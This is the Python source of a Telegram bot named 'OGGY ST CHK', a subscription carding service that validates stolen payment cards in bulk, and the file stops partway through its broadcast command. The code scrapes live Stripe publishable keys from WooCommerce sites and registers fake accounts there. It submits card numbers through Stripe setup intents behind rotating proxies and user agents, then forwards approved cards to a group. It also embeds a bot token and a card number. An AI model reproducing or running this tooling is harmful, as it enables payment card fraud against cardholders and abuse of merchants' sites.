# bot.py
# OGGY ST CHK — Telegram bot
# Owner: 8919487892
# Engine ported from Jinx app.py

import asyncio
import html
import logging
import os
import random
import re
import sqlite3
import string
import time
import uuid
from datetime import datetime, timezone
from typing import Optional

import requests
from fake_useragent import UserAgent

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
    ApplicationHandlerStop,
)

# ===================== CONFIG =====================
BOT_TOKEN = "8593907353:AAE6Uh02Rhm8KWUI3aqYy1IfAs3dZHHhljk"
OWNER_ID = 8919487892
BOT_NAME = "OGGY ST CHK"
DB_PATH = os.environ.get("DB_PATH", "oggy.db")

TEST_CARD = "4031630422575208|01|2030|280"

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", level=logging.INFO)
logger = logging.getLogger("oggy")
logging.getLogger("httpx").setLevel(logging.WARNING)

# ===================== DB =====================
def db() -> sqlite3.Connection:
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def init_db():
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id      INTEGER PRIMARY KEY,
            username     TEXT,
            first_seen   INTEGER,
            expiry_ts    INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS keys (
            key         TEXT PRIMARY KEY,
            duration_s  INTEGER,
            created_by  INTEGER,
            created_at  INTEGER,
            used_by     INTEGER DEFAULT NULL,
            used_at     INTEGER DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS admins (
            user_id     INTEGER PRIMARY KEY,
            added_by    INTEGER,
            added_at    INTEGER
        );
        CREATE TABLE IF NOT EXISTS config (
            k TEXT PRIMARY KEY,
            v TEXT
        );
        CREATE TABLE IF NOT EXISTS charges (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id     INTEGER,
            card        TEXT,
            response    TEXT,
            ts          INTEGER
        );
        """)
        # migration: add banned column if missing
        cols = [r["name"] for r in c.execute("PRAGMA table_info(users)").fetchall()]
        if "banned" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
        if "ban_reason" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN ban_reason TEXT DEFAULT ''")

def cfg_get(k: str, default=None):
    with db() as c:
        row = c.execute("SELECT v FROM config WHERE k=?", (k,)).fetchone()
        return row["v"] if row else default

def cfg_set(k: str, v: str):
    with db() as c:
        c.execute("INSERT INTO config(k,v) VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=excluded.v",
                  (k, str(v)))

def user_ensure(user_id: int, username: str = ""):
    with db() as c:
        c.execute(
            "INSERT INTO users(user_id, username, first_seen) VALUES(?,?,?) "
            "ON CONFLICT(user_id) DO UPDATE SET username=excluded.username",
            (user_id, username or "", int(time.time())),
        )

def user_get(user_id: int):
    with db() as c:
        return c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

def user_add_time(user_id: int, seconds: int):
    with db() as c:
        row = c.execute("SELECT expiry_ts FROM users WHERE user_id=?", (user_id,)).fetchone()
        now = int(time.time())
        base = row["expiry_ts"] if row and row["expiry_ts"] > now else now
        c.execute("UPDATE users SET expiry_ts=? WHERE user_id=?", (base + seconds, user_id))

def user_revoke(user_id: int) -> bool:
    with db() as c:
        r = c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not r:
            return False
        c.execute("UPDATE users SET expiry_ts=0 WHERE user_id=?", (user_id,))
    return True

def user_ban(user_id: int, reason: str = "") -> bool:
    with db() as c:
        r = c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not r:
            return False
        c.execute("UPDATE users SET banned=1, ban_reason=? WHERE user_id=?", (reason, user_id))
    return True

def user_unban(user_id: int) -> bool:
    with db() as c:
        c.execute("UPDATE users SET banned=0, ban_reason='' WHERE user_id=?", (user_id,))
    return True

def user_is_banned(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return False
    row = user_get(user_id)
    return bool(row and row["banned"])

def user_is_admin(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    with db() as c:
        return c.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,)).fetchone() is not None

def user_has_plan(user_id: int) -> bool:
    if user_id == OWNER_ID or user_is_admin(user_id):
        return True
    if user_is_banned(user_id):
        return False
    row = user_get(user_id)
    return bool(row and row["expiry_ts"] and row["expiry_ts"] > int(time.time()))

def key_generate(count: int, duration_s: int, created_by: int) -> list[str]:
    out = []
    with db() as c:
        for _ in range(count):
            for _try in range(30):
                k = "OGGY-PROO-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
                if not c.execute("SELECT 1 FROM keys WHERE key=?", (k,)).fetchone():
                    c.execute("INSERT INTO keys(key, duration_s, created_by, created_at) VALUES(?,?,?,?)",
                              (k, duration_s, created_by, int(time.time())))
                    out.append(k)
                    break
    return out

def key_redeem(k: str, user_id: int) -> tuple[bool, str]:
    k = k.strip().upper()
    with db() as c:
        row = c.execute("SELECT * FROM keys WHERE key=?", (k,)).fetchone()
        if not row:
            return False, "❌ Invalid key."
        if row["used_by"] is not None:
            return False, "❌ Key already used."
        c.execute("UPDATE keys SET used_by=?, used_at=? WHERE key=?",
                  (user_id, int(time.time()), k))
    user_add_time(user_id, row["duration_s"])
    return True, f"✅ Redeemed — +{fmt_duration(row['duration_s'])} added."

def fmt_duration(s: int) -> str:
    d, h, m = s // 86400, (s % 86400) // 3600, (s % 3600) // 60
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m and not d: parts.append(f"{m}m")
    if not parts: parts.append(f"{s}s")
    return "".join(parts)

def parse_duration(s: str) -> Optional[int]:
    s = s.strip().lower()
    m = re.match(r"^(\d+)\s*(s|m|h|d|w|mo)$", s)
    if not m:
        return None
    n, unit = int(m.group(1)), m.group(2)
    mult = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800, "mo": 2592000}[unit]
    return n * mult

# ===================== STATE =====================
USER_STATE: dict = {}

def get_state(uid: int) -> dict:
    if uid not in USER_STATE:
        USER_STATE[uid] = {
            "pending": None,
            "pending_cards": [],
            "pending_key_count": 0,
            "mass_running": False,
            "mass_chat_id": None,
            "mass_msg_id": None,
            "mass_done": 0, "mass_total": 0,
            "mass_approved": 0, "mass_declined": 0, "mass_threed": 0,
        }
    return USER_STATE[uid]

# ===================== AUTH =====================
async def _deny(update: Update, msg: str):
    if update.callback_query:
        await update.callback_query.answer(msg, show_alert=True)
    elif update.message:
        await update.message.reply_text(msg)

def owner_only(fn):
    async def w(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        u = update.effective_user
        if not u or u.id != OWNER_ID:
            await _deny(update, "👑 Owner only.")
            return
        return await fn(update, ctx)
    return w

def admin_only(fn):
    async def w(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        u = update.effective_user
        if not u or not user_is_admin(u.id):
            await _deny(update, "🛠 Admins only.")
            return
        return await fn(update, ctx)
    return w

def plan_required(fn):
    async def w(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        u = update.effective_user
        if not u:
            return
        user_ensure(u.id, u.username or "")
        if user_is_banned(u.id):
            await _deny(update, "🚫 You are banned.")
            return
        if not user_has_plan(u.id):
            txt = (
                f"🚫 <b>No active plan</b>\n\n"
                f"Redeem a key with:\n"
                f"<code>/redeem OGGY-PROO-XXXX</code>"
            )
            if update.callback_query:
                await update.callback_query.answer("No active plan.", show_alert=True)
            else:
                await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
            return
        return await fn(update, ctx)
    return w

# ===================== BANNED GUARD (runs first) =====================
async def banned_guard(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u and user_is_banned(u.id):
        if update.callback_query:
            await update.callback_query.answer("🚫 You are banned.", show_alert=True)
        elif update.message:
            row = user_get(u.id)
            reason = (row["ban_reason"] if row else "") or "no reason given"
            await update.message.reply_text(
                f"🚫 <b>You are banned from using {BOT_NAME}.</b>\n\n"
                f"Reason: <i>{html.escape(reason)}</i>",
                parse_mode=ParseMode.HTML,
            )
        raise ApplicationHandlerStop

# ===================== PROXY / STRIPE ENGINE =====================
def parse_proxy_format(proxy: str) -> Optional[dict]:
    if not proxy: return None
    proxy = proxy.strip()
    ptype = "http"
    m = re.match(r"^(socks5|socks4|http|https)://(.+)$", proxy, re.IGNORECASE)
    if m:
        ptype = m.group(1).lower(); proxy = m.group(2)
    host = port = user = pwd = ""
    m = re.match(r"^([^:@]+):([^@]+)@([^:@]+):(\d+)$", proxy)
    if m:
        user, pwd, host, port = m.groups()
    elif re.match(r"^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$", proxy):
        m = re.match(r"^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$", proxy)
        host, port, user, pwd = m.groups()
    elif re.match(r"^([^:]+):(\d+):([^:]+):(.+)$", proxy):
        m = re.match(r"^([^:]+):(\d+):([^:]+):(.+)$", proxy)
        host, port, user, pwd = m.groups()
    elif re.match(r"^([^:@]+):(\d+)$", proxy):
        m = re.match(r"^([^:@]+):(\d+)$", proxy)
        host, port = m.groups()
    else:
        return None
    if not host or not port:
        return None
    url = f"{ptype}://{user}:{pwd}@{host}:{port}" if (user and pwd) else f"{ptype}://{host}:{port}"
    return {"http": url, "https": url, "original": proxy}

def get_stripe_key(domain: str, proxy_dict=None) -> Optional[str]:
    urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params",
    ]
    patterns = [
        r"pk_live_[a-zA-Z0-9_]+",
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]',
    ]
    for url in urls:
        try:
            r = requests.get(url, headers={"User-Agent": UserAgent().random}, timeout=10,
                             verify=False, proxies=proxy_dict)
            if r.status_code == 200:
                for pat in patterns:
                    m = re.search(pat, r.text)
                    if m:
                        km = re.search(r"pk_live_[a-zA-Z0-9_]+", m.group(0))
                        if km:
                            return km.group(0)
        except Exception:
            continue
    return None

def extract_nonce_from_page(body: str, domain: str) -> Optional[str]:
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
    ]
    for pat in patterns:
        m = re.search(pat, body)
        if m:
            return m.group(1)
    return None

def _gen_creds():
    u = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return u, f"{u}@gmail.com", "".join(random.choices(string.ascii_letters + string.digits, k=12))

def register_account(domain: str, session: requests.Session, proxy_dict=None):
    try:
        r = session.get(f"https://{domain}/my-account/", verify=False, proxies=proxy_dict)
        nonce = None
        for pat in (
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']',
        ):
            m = re.search(pat, r.text)
            if m:
                nonce = m.group(1); break
        if not nonce:
            return False, "no reg nonce"
        u, e, p = _gen_creds()
        session.post(
            f"https://{domain}/my-account/",
            data={"username": u, "email": e, "password": p,
                  "woocommerce-register-nonce": nonce,
                  "_wp_http_referer": "/my-account/", "register": "Register"},
            headers={"Referer": f"https://{domain}/my-account/"},
            verify=False, proxies=proxy_dict,
        )
        return True, "ok"
    except Exception as ex:
        return False, str(ex)

def process_card_enhanced(domain: str, ccx: str, proxy_dict=None) -> dict:
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {"Response": "Invalid card format", "Status": "Declined"}
    if "20" in yy:
        yy = yy.split("20")[1]

    ua = UserAgent().random
    mid = str(uuid.uuid4())
    sid = str(uuid.uuid4()) + str(int(time.time()))

    session = requests.Session()
    session.headers.update({"User-Agent": ua})

    pk = get_stripe_key(domain, proxy_dict)
    if not pk:
        return {"Response": "Site has no Stripe integration", "Status": "Declined"}

    register_account(domain, session, proxy_dict)

    nonce = None
    for url in (f"https://{domain}/my-account/add-payment-method/",
                f"https://{domain}/checkout/",
                f"https://{domain}/my-account/"):
        try:
            r = session.get(url, timeout=10, verify=False, proxies=proxy_dict)
            if r.status_code == 200:
                nonce = extract_nonce_from_page(r.text, domain)
                if nonce: break
        except Exception:
            continue
    if not nonce:
        return {"Response": "No nonce found", "Status": "Declined"}

    pm_data = {
        "type": "card",
        "card[number]": n, "card[cvc]": cvc,
        "card[exp_year]": yy, "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "US",
        "billing_details[address][postal_code]": "10080",
        "billing_details[name]": "Sahil Pro",
        "pasted_fields": "number",
        "payment_user_agent": f"stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent",
        "referrer": f"https://{domain}",
        "time_on_page": str(int(time.time()) % 100000),
        "key": pk,
        "_stripe_version": "2024-06-20",
        "guid": str(uuid.uuid4()),
        "muid": mid, "sid": sid,
    }
    try:
        pm = requests.post(
            "https://api.stripe.com/v1/payment_methods", data=pm_data,
            headers={"User-Agent": ua, "accept": "application/json",
                     "content-type": "application/x-www-form-urlencoded",
                     "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"},
            timeout=15, verify=False, proxies=proxy_dict,
        )
        pmj = pm.json()
        if "id" not in pmj:
            return {"Response": pmj.get("error", {}).get("message", "PM error"), "Status": "Declined"}
        pm_id = pmj["id"]
    except Exception as e:
        return {"Response": f"PM failed: {e}", "Status": "Declined"}

    endpoints = [
        {"url": f"https://{domain}/", "params": {"wc-ajax": "wc_stripe_create_and_confirm_setup_intent"}},
        {"url": f"https://{domain}/wp-admin/admin-ajax.php", "params": {}},
        {"url": f"https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", "params": {}},
    ]
    payloads = [
        {"action": "wc_stripe_create_and_confirm_setup_intent",
         "wc-stripe-payment-method": pm_id, "wc-stripe-payment-type": "card", "_ajax_nonce": nonce},
        {"action": "wc_stripe_create_setup_intent",
         "payment_method_id": pm_id, "_wpnonce": nonce},
    ]
    for ep in endpoints:
        for pl in payloads:
            try:
                r = session.post(
                    ep["url"], params=ep.get("params", {}), data=pl,
                    headers={"User-Agent": ua,
                             "Referer": f"https://{domain}/my-account/add-payment-method/",
                             "accept": "*/*",
                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                             "origin": f"https://{domain}", "x-requested-with": "XMLHttpRequest"},
                    timeout=15, verify=False, proxies=proxy_dict,
                )
                try: sd = r.json()
                except Exception: sd = {"raw_response": r.text}
                if sd.get("success"):
                    st = sd["data"].get("status")
                    if st == "requires_action":
                        return {"Response": "3D", "Status": "Declined"}
                    if st == "succeeded":
                        return {"Response": "Card Added", "Status": "Approved"}
                    if "error" in sd["data"]:
                        return {"Response": sd["data"]["error"].get("message", "err"), "Status": "Declined"}
                if not sd.get("success") and isinstance(sd.get("data"), dict) and "error" in sd["data"]:
                    return {"Response": sd["data"]["error"].get("message", "err"), "Status": "Declined"}
                if sd.get("status") in ("succeeded", "success"):
                    return {"Response": "Card Added", "Status": "Approved"}
            except Exception:
                continue
    return {"Response": "All attempts failed", "Status": "Declined"}

# ===================== UI HELPERS =====================
def now_ts() -> int:
    return int(time.time())

def fmt_user(u: sqlite3.Row) -> str:
    exp = u["expiry_ts"] or 0
    banned = u["banned"] if "banned" in u.keys() else 0
    if u["user_id"] == OWNER_ID:
        plan = "👑 OWNER"
    elif user_is_admin(u["user_id"]):
        plan = "🛠 ADMIN"
    elif banned:
        plan = "🚫 BANNED"
    elif exp > now_ts():
        plan = f"💎 {fmt_duration(exp-now_ts())} left"
    else:
        plan = "❌ none"
    uname = f"@{u['username']}" if u["username"] else "—"
    return f"<code>{u['user_id']}</code> — {uname} — {plan}"

CARD_LINE_RE = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def parse_cards_from_text(text: str) -> list[str]:
    return [l.strip() for l in text.splitlines() if CARD_LINE_RE.match(l.strip())]

# ===================== KEYBOARDS =====================
def main_menu(is_admin=False, is_owner=False) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("💳 Single Check", callback_data="u:single_hint"),
         InlineKeyboardButton("⚡ Bulk Check", callback_data="u:bulk_hint")],
        [InlineKeyboardButton("🔑 Redeem Key", callback_data="u:redeem_hint"),
         InlineKeyboardButton("👤 My Plan", callback_data="u:me")],
        [InlineKeyboardButton("🌐 PK Extractor", callback_data="u:key_hint"),
         InlineKeyboardButton("📖 Help", callback_data="u:help")],
    ]
    if is_admin or is_owner:
        rows.append([InlineKeyboardButton("🛠  ADMIN PANEL  🛠", callback_data="a:panel")])
    return InlineKeyboardMarkup(rows)

def admin_panel_kb(is_owner=False) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("🔑 Generate Keys", callback_data="a:genkeys"),
         InlineKeyboardButton("📣 Broadcast", callback_data="a:broadcast")],
        [InlineKeyboardButton("👥 Users", callback_data="a:users"),
         InlineKeyboardButton("📊 Stats", callback_data="a:stats")],
        [InlineKeyboardButton("🗝 Unused Keys", callback_data="a:unused"),
         InlineKeyboardButton("🚫 Banned List", callback_data="a:banned")],
    ]
    if is_owner:
        rows.append([InlineKeyboardButton("👑 ─── ADMIN MGMT ─── 👑", callback_data="o:admins")])
        rows.append([InlineKeyboardButton("📥 Set Charged GC", callback_data="o:setgc"),
                     InlineKeyboardButton("👁 View Charged GC", callback_data="o:getgc")])
        rows.append([InlineKeyboardButton("💾 Recent Charges", callback_data="o:charges"),
                     InlineKeyboardButton("🌐 Set Target Site", callback_data="o:site_hint")])
    rows.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu:home")])
    return InlineKeyboardMarkup(rows)

def admin_mgmt_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Admin", callback_data="o:addadmin"),
         InlineKeyboardButton("➖ Remove Admin", callback_data="o:deladmin")],
        [InlineKeyboardButton("📋 List Admins", callback_data="o:listadmins")],
        [InlineKeyboardButton("« Back to Panel", callback_data="a:panel")],
    ])

def back_main_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="menu:home")]])

def start_button_kb(count: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"▶️  START  ({count} cards)", callback_data="m:start")],
        [InlineKeyboardButton("🗑  Clear", callback_data="m:clear")],
    ])

def running_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🛑  STOP", callback_data="m:stop")]])

# ===================== USER COMMANDS =====================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    is_admin = user_is_admin(u.id); is_owner = u.id == OWNER_ID
    user = user_get(u.id)
    exp = user["expiry_ts"] or 0
    if is_owner:
        plan_txt = "👑 Owner"
    elif is_admin:
        plan_txt = "🛠 Admin"
    elif exp > now_ts():
        plan_txt = f"💎 Active — {fmt_duration(exp-now_ts())} left"
    else:
        plan_txt = "❌ No active plan"

    txt = (
        f"╔══════════════════════════╗\n"
        f"   🤖  <b>{BOT_NAME}</b>  🤖\n"
        f"╚══════════════════════════╝\n\n"
        f"👤 Plan: <b>{plan_txt}</b>\n\n"
        f"━━━━━━━━━  ⚙️ COMMANDS  ━━━━━━━━━\n"
        f"💳 <code>/st cc|mm|yy|cvv</code> — single check\n"
        f"⚡ /mass — bulk check (.txt or paste)\n"
        f"🌐 <code>/key N</code> — extract N pk_live keys\n"
        f"🔑 <code>/redeem OGGY-PROO-XXXX</code> — activate\n"
        f"👤 /me — my profile\n"
        f"📖 /help — full help"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML,
                                    reply_markup=main_menu(is_admin=is_admin, is_owner=is_owner))

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    is_admin = user_is_admin(u.id); is_owner = u.id == OWNER_ID
    txt = (
        f"📖 <b>{BOT_NAME} — Help</b>\n\n"
        f"━━━━  👤 USER  ━━━━\n"
        f"💳 <code>/st 4111111111111111|12|25|123</code>\n"
        f"   → Single card check\n\n"
        f"⚡ <code>/mass</code>\n"
        f"   → Bulk flow. Reply to a <b>.txt</b> or paste\n"
        f"     cards (one per line). A START button appears.\n\n"
        f"🌐 <code>/key 5</code>\n"
        f"   → Extract 5 pk_live keys from sites\n\n"
        f"🔑 <code>/redeem OGGY-PROO-XXXX</code>\n"
        f"   → Activate your plan\n\n"
        f"👤 <code>/me</code> — profile &amp; plan status\n"
    )
    if is_admin or is_owner:
        txt += (
            f"\n━━━━  🛠 ADMIN  ━━━━\n"
            f"🔑 <code>/genkey &lt;count&gt; &lt;duration&gt;</code>\n"
            f"   → e.g. <code>/genkey 10 30d</code>\n"
            f"📣 <code>/broadcast &lt;text&gt;</code>\n"
            f"👥 <code>/users</code>\n"
            f"🚫 <code>/ban &lt;user_id&gt; [reason]</code>\n"
            f"✅ <code>/unban &lt;user_id&gt;</code>\n"
            f"♻️ <code>/revoke &lt;user_id&gt;</code>\n"
            f"🛠 <code>/admin</code> — open panel\n"
        )
    if is_owner:
        txt += (
            f"\n━━━━  👑 OWNER  ━━━━\n"
            f"➕ <code>/addadmin &lt;id&gt;</code>\n"
            f"➖ <code>/deladmin &lt;id&gt;</code>\n"
            f"📥 <code>/setgc -100...</code> — charged GC\n"
            f"👁 <code>/getgc</code>\n"
            f"🌐 <code>/setsite domain.com</code>\n"
            f"🧦 <code>/setproxy host:port</code>\n"
            f"💾 <code>/charges [N]</code> — recent hits\n"
        )
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML,
                                    reply_markup=main_menu(is_admin=is_admin, is_owner=is_owner))

async def cmd_me(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    row = user_get(u.id)
    exp = row["expiry_ts"] or 0
    banned = row["banned"] if "banned" in row.keys() else 0

    if u.id == OWNER_ID:
        plan_line = "👑 <b>OWNER</b>"
    elif user_is_admin(u.id):
        plan_line = "🛠 <b>ADMIN</b>"
    elif banned:
        plan_line = "🚫 <b>BANNED</b>"
    elif exp > now_ts():
        plan_line = f"💎 <b>Active</b> — {fmt_duration(exp-now_ts())} left"
    else:
        plan_line = "❌ <b>None</b> — redeem a key"

    txt = (
        f"╭─ 👤  <b>PROFILE</b>\n"
        f"│\n"
        f"├ 🆔 <code>{row['user_id']}</code>\n"
        f"├ 📛 @{row['username'] or '—'}\n"
        f"├ 🔍 Checks: <b>{row['total_checks']}</b>\n"
        f"╰ 💠 Plan: {plan_line}\n"
    )
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=back_main_kb())

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if not ctx.args:
        await update.message.reply_text("🔑 Usage: <code>/redeem OGGY-PROO-XXXX</code>",
                                        parse_mode=ParseMode.HTML)
        return
    ok, msg = key_redeem(ctx.args[0], u.id)
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@plan_required
async def cmd_single(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if not ctx.args:
        await update.message.reply_text("💳 Usage: <code>/st 4111111111111111|12|25|123</code>",
                                        parse_mode=ParseMode.HTML)
        return
    cc = ctx.args[0].strip()
    if not CARD_LINE_RE.match(cc):
        await update.message.reply_text("❌ Invalid format. Use <code>N|MM|YY|CVV</code>",
                                        parse_mode=ParseMode.HTML)
        return

    site = (cfg_get("working_sites", "") or "").split(",")[0].strip()
    if not site:
        await update.message.reply_text("⚠️ No target site configured.")
        return
    proxy_str = cfg_get("proxy", "")
    proxy_dict = parse_proxy_format(proxy_str) if proxy_str else None

    msg = await update.message.reply_text("⏳ <b>Checking…</b>", parse_mode=ParseMode.HTML)
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, process_card_enhanced, site, cc, proxy_dict)

    with db() as c:
        c.execute("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (u.id,))
        c.execute("INSERT INTO charges(user_id, card, response, ts) VALUES(?,?,?,?)",
                  (u.id, cc, res.get("Response", ""), now_ts()))

    status = res.get("Status", "?")
    resp = html.escape(res.get("Response", "?"))
    resp_l = resp.lower()
    if status == "Approved":
        icon = "✅"
    elif "3d" in resp_l or "secure" in resp_l:
        icon = "🔐"
    elif "insufficient" in resp_l:
        icon = "💸"
    else:
        icon = "❌"

    await msg.edit_text(
        f"{icon} <b>{status}</b>\n\n"
        f"💳 <code>{cc}</code>\n"
        f"🌐 <code>{site}</code>\n"
        f"📩 {resp}",
        parse_mode=ParseMode.HTML,
    )

    if status == "Approved":
        await forward_to_gc(ctx.bot, u, cc, resp, site)

async def cmd_mass(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if user_is_banned(u.id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if not user_has_plan(u.id):
        await update.message.reply_text("🚫 No active plan. Use <code>/redeem</code>.",
                                        parse_mode=ParseMode.HTML)
        return
    await update.message.reply_text(
        f"⚡ <b>Bulk Check</b>\n\n"
        f"📄 <b>Option 1:</b> Send or reply to a <b>.txt</b> file\n"
        f"✍️ <b>Option 2:</b> Paste cards directly, one per line\n"
        f"    Format: <code>N|MM|YY|CVV</code>\n\n"
        f"A <b>START</b> button will appear after loading.",
        parse_mode=ParseMode.HTML,
    )

async def cmd_key(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    user_ensure(u.id, u.username or "")
    if user_is_banned(u.id) or not user_has_plan(u.id):
        await update.message.reply_text("🚫 No active plan.")
        return
    if not ctx.args:
        await update.message.reply_text("🌐 Usage: <code>/key 5</code>", parse_mode=ParseMode.HTML)
        return
    try:
        n = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Number required."); return
    if n < 1 or n > 50:
        await update.message.reply_text("⚠️ Between 1 and 50."); return
    st = get_state(u.id)
    st["pending"] = "awaiting_sites_for_key"
    st["pending_key_count"] = n
    await update.message.reply_text(
        f"🌐 Send up to <b>{n}</b> sites (one per line).\n"
        f"I'll extract <code>pk_live_</code> keys from each.",
        parse_mode=ParseMode.HTML,
    )

# ===================== ADMIN / OWNER COMMANDS =====================
@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    is_owner = u.id == OWNER_ID
    txt = (
        f"╔════════════════════════╗\n"
        f"   🛠  <b>ADMIN PANEL</b>  🛠\n"
        f"╚════════════════════════╝"
    )
    if update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                txt, parse_mode=ParseMode.HTML,
                reply_markup=admin_panel_kb(is_owner=is_owner))
        except Exception:
            pass
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML,
                                        reply_markup=admin_panel_kb(is_owner=is_owner))

@admin_only
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    args = ctx.args or []
    if len(args) < 2:
        await update.message.reply_text(
            "🔑 <b>Usage:</b> <code>/genkey &lt;count&gt; &lt;duration&gt;</code>\n\n"
            "⏱ Durations: <code>30m</code> · <code>12h</code> · <code>7d</code> · "
            "<code>30d</code> · <code>1w</code> · <code>1mo</code>\n"
            "📌 Example: <code>/genkey 5 7d</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        count = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid count."); return
    if count < 1 or count > 100:
        await update.message.reply_text("⚠️ Count 1-100."); return
    dur = parse_duration(args[1])
    if not dur:
        await update.message.reply_text("❌ Invalid duration. e.g. 7d, 12h, 30m."); return

    keys = key_generate(count, dur, u.id)
    body = "\n".join(f"  <code>{k}</code>" for k in keys)
    await update.message.reply_text(
        f"╭─ 🔑  <b>{len(keys)} KEYS GENERATED</b>\n"
        f"│  ⏱ {fmt_duration(dur)} each\n"
        f"│\n{body}\n"
        f"╰─  tap to copy",
        parse_mode=ParseMode.HTML,
    )

@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = " ".join(ctx.args).strip() if ctx.args else ""
    if not text:
        await update.message.reply_text("📣 Usage: <code>/broadcast your message</code>",
                                        parse_mode=ParseMode.HTML)
        return
    with db() as c:
        rows = c.execute("SELECT user_id FROM users WHERE banned=0").fetchall()
    sent = failed = 0
    for r in rows:
        try:
            await ctx.bot.send_message(r["user_id"],
                                       f"📣 <b>{BOT_NAME}</b>\n\n{text}",
                                       parse_mode=ParseMode.HTML)
            sent += 1
